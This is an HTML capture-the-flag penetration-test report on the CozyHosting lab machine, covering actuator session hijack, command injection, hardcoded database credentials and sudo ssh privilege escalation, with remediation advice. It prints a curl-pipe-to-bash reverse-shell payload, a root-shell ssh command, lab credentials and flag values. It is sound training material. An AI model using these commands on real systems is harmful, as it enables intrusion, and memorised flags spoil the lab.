@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - CozyHosting</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: CozyHosting</h2>
+        <h3 class="report-meta">Date: May 2, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>A penetration test was performed on the CozyHosting machine (10.10.11.230). The engagement uncovered a chain of critical vulnerabilities starting with information disclosure from an exposed Spring Boot Actuator endpoint. This led to a session hijack, followed by command injection to gain initial access. Subsequent internal enumeration revealed plaintext database credentials, allowing for the extraction of user password hashes. Finally, a misconfigured sudo rule for the SSH client was exploited to escalate privileges to root, resulting in a complete system compromise.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>4 critical vulnerabilities</strong> identified and chained together.</li>
+            <li><strong>Complete system compromise</strong> from unauthenticated access to root.</li>
+            <li><strong>Information Disclosure</strong> via exposed Spring Boot Actuator endpoints.</li>
+            <li><strong>Command Injection</strong> in a privileged web application function.</li>
+            <li><strong>Credential Exposure</strong> in application configuration files.</li>
+            <li><strong>Privilege Escalation</strong> through a misconfigured sudo rule.</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The system possesses multiple high-impact vulnerabilities that create a direct and repeatable path for an external attacker to gain full administrative control. The public-facing misconfigurations provide a low-barrier entry point for attackers.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.230</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.14</li>
+            <li><strong>Operating System:</strong> Ubuntu 22.04.3 LTS</li>
+            <li><strong>Hostname:</strong> cozyhosting.htb</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> An exposed Spring Boot Actuator `/sessions` endpoint was used to hijack an authenticated user's session. This access was leveraged to exploit a command injection vulnerability in an administrative panel function, leading to a reverse shell.</li>
+            <li><strong>Lateral Movement:</strong> Plaintext PostgreSQL credentials were found in the application's `.jar` file. These were used to connect to the database and retrieve user password hashes. A hash was cracked, yielding credentials for the user `josh`, enabling SSH access.</li>
+            <li><strong>Privilege Escalation:</strong> The user `josh` had sudo privileges to run the `/usr/bin/ssh` client as root. A lesser-known feature of OpenSSH (`LocalCommand`) was abused to execute a local shell with root privileges.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Information Disclosure via Exposed Spring Boot Actuator</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.5<br>
+        <strong>CWE:</strong> CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)</p>
+        <p><strong>Description:</strong><br>
+        The web application exposes several Spring Boot Actuator endpoints (e.g., `/actuator/env`, `/actuator/sessions`) to the public without authentication. The `/actuator/sessions` endpoint reveals active session identifiers for authenticated users. An attacker can use these session IDs to hijack a valid user session and gain unauthorized access to the application's administrative dashboard.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Endpoint:</strong> `http://cozyhosting.htb/actuator/sessions`</li>
+            <li><strong>Information Disclosed:</strong> Active user session tokens.</li>
+            <li><strong>Exploitation Method:</strong> Capturing a session token (e.g., `C8AD2772BD62EF83016C822825944207` for user `kanderson`) and using it as a browser cookie to impersonate the user.</li>
+        </ul>
+        <p><strong>Impact:</strong> This vulnerability allows an unauthenticated attacker to bypass login controls and gain privileged access to the application, which serves as the entry point for further attacks like command injection.</p>
+
+        <h3>Finding 2: OS Command Injection in Admin Panel</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 9.8<br>
+        <strong>CWE:</strong> CWE-78 (Improper Neutralization of Special Elements used in an OS Command - 'OS Command Injection')</p>
+        <p><strong>Description:</strong><br>
+        After hijacking a session, the attacker gains access to an "Admin Dashboard" with a feature to "Include host into automatic patching." The "Username" input field in this feature is vulnerable to command injection. The backend system concatenates the user-supplied username directly into a shell command without proper sanitization. An attacker can inject arbitrary commands using a semicolon (`;`).</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Parameter:</strong> `Username` field in the patching feature.</li>
+            <li><strong>Exploitation Method:</strong> Injecting a payload to download and execute a reverse shell script.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following payload was entered into the `Username` field:</p>
+        <pre><code>test; curl${IFS}http://10.10.14.14:8000/rev.sh | bash;</code></pre>
+        <p><strong>Impact:</strong> Successful exploitation results in remote code execution on the server as the `app` user, providing the attacker with their initial foothold on the system.</p>
+
+        <h3>Finding 3: Hardcoded Credentials in Configuration File</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.5<br>
+        <strong>CWE:</strong> CWE-798 (Use of Hard-coded Credentials)</p>
+        <p><strong>Description:</strong><br>
+        After gaining shell access, the application's source code, packaged as a `.jar` file, was analyzed. The `application.properties` file within the archive contained hardcoded plaintext credentials for the PostgreSQL database.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Location of Credentials:</strong> `/app/cloudhosting-0.0.1.jar` -> `BOOT-INF/classes/application.properties`</li>
+            <li><strong>Credentials Found:</strong>
+                <ul>
+                    <li>Username: `postgres`</li>
+                    <li>Password: `Vg&nvzAQ7XxR`</li>
+                </ul>
+            </li>
+        </ul>
+        <p><strong>Impact:</strong> These credentials grant full access to the application's database, allowing an attacker to exfiltrate or manipulate sensitive data. In this case, it enabled the extraction of user password hashes for lateral movement.</p>
+
+        <h3>Finding 4: Privilege Escalation via Sudo Misconfiguration</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-269 (Improper Privilege Management)</p>
+        <p><strong>Description:</strong><br>
+        The user `josh` is permitted to execute the `/usr/bin/ssh` command as the root user via `sudo`. The OpenSSH client has a `LocalCommand` option that, if enabled with `PermitLocalCommand=yes`, will execute a command on the client machine after a successful connection. By running the `ssh` command as root and connecting to localhost, this feature can be abused to execute any command as root, effectively bypassing privilege restrictions.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Component:</strong> Sudoers configuration for the `ssh` command.</li>
+            <li><strong>Exploitation Method:</strong> Using specific command-line options for `ssh` to invoke a local root shell.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following command was executed to gain a root shell:</p>
+        <pre><code>sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1</code></pre>
+        <p><strong>Impact:</strong> This misconfiguration provides a direct path for a standard user to escalate their privileges to root, leading to a complete compromise of the system.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Scanning:</strong> Identified open ports 22 (SSH) and 80 (HTTP).</li>
+            <li><strong>Web Enumeration:</strong> `nuclei` scan discovered exposed Spring Boot Actuator endpoints.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access</h3>
+        <ul>
+            <li><strong>Information Disclosure:</strong> Retrieved active session IDs from `/actuator/sessions`.</li>
+            <li><strong>Session Hijack:</strong> Used a stolen session cookie to access the admin dashboard.</li>
+            <li><strong>Command Injection:</strong> Exploited the "Username" field to execute a command that downloaded and ran a reverse shell script.</li>
+            <li><strong>Foothold Gained:</strong> Received a shell as the `app` user.</li>
+        </ul>
+        
+        <h3>Phase 3: Lateral Movement</h3>
+        <ul>
+            <li><strong>Internal Enumeration:</strong> Found and decompiled the `cloudhosting-0.0.1.jar` file.</li>
+            <li><strong>Credential Extraction:</strong> Discovered plaintext PostgreSQL credentials in `application.properties`.</li>
+            <li><strong>Database Access:</strong> Connected to the database and dumped the `users` table, obtaining password hashes.</li>
+            <li><strong>Offline Cracking:</strong> Cracked the `admin` user's hash, revealing the password `manchesterunited`.</li>
+            <li><strong>SSH Access:</strong> Successfully authenticated via SSH as user `josh`.</li>
+        </ul>
+
+        <h3>Phase 4: Privilege Escalation</h3>
+        <ul>
+            <li><strong>Sudo Enumeration:</strong> Identified that `josh` can run `ssh` as root.</li>
+            <li><strong>Exploit Research:</strong> Identified the `LocalCommand` abuse vector for SSH.</li>
+            <li><strong>Root Access:</strong> Executed the crafted `sudo ssh` command to spawn a root shell.</li>
+            <li><strong>Flags Captured:</strong> Retrieved both `user.txt` and `root.txt`.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Restrict Actuator Endpoints:</strong> Spring Boot Actuator endpoints should never be exposed publicly. They should be disabled or protected by robust authentication and authorization controls, accessible only from trusted internal networks.</li>
+            <li><strong>Sanitize All User Input:</strong> All input received from users, especially in functions that interact with the operating system, must be strictly sanitized and validated to prevent command injection. Use parameterized queries or safe APIs instead of string concatenation.</li>
+            <li><strong>Remove Hardcoded Credentials:</strong> Never store credentials in plaintext in source code or configuration files. Use a secure secrets management solution like HashiCorp Vault, AWS Secrets Manager, or environment variables to handle sensitive data.</li>
+            <li><strong>Apply Principle of Least Privilege to Sudo Rules:</strong> Sudo rules should be as specific as possible. Granting permissions for complex commands like `ssh` is extremely risky. If a user needs to perform a specific task as root, provide a dedicated, secure script for that task instead of broad command access.</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Enforce Strong Password Hashing:</strong> While the application used bcrypt, which is strong, ensure this is standard practice for all credential storage.</li>
+            <li><strong>Session Management Security:</strong> Implement security measures like binding session tokens to IP addresses to make session hijacking more difficult.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/josh/user.txt</li>
+            <li><strong>Value:</strong> 03b543245f9d780a4d59ae6676c63db6</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> 76610360093e35b8f60d68d6e66afec0</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>Exposed Endpoint:</strong> `/actuator/sessions`</li>
+            <li><strong>Command Injection Payload:</strong> `test; curl...`</li>
+            <li><strong>Database Credentials:</strong> `postgres:Vg&nvzAQ7XxR`</li>
+            <li><strong>Privilege Escalation Command:</strong> `sudo ssh -o PermitLocalCommand=yes...`</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The CozyHosting system exhibits a cascade of severe security failings. The initial attack surface, an improperly secured web application framework, provided an easy entry point. This was compounded by insecure development practices, such as command injection vulnerabilities and hardcoded credentials. Finally, a critical misconfiguration in system administration (sudo rules) allowed for a trivial privilege escalation. Each vulnerability, while severe on its own, became part of a chain that allowed for a full compromise of the host with minimal difficulty.</p>
+        
+        <p><strong>Business Risk:</strong> CRITICAL - The system is at immediate risk of a complete takeover by an unauthenticated attacker. This could lead to a breach of all application data, service unavailability, and the server being used to launch further attacks against the internal network.</p>
+        <p><strong>Technical Risk:</strong> The combination of an exposed administrative interface, a command injection flaw, plaintext credentials, and an insecure sudo policy creates a straightforward path to full system compromise.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> May 2, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
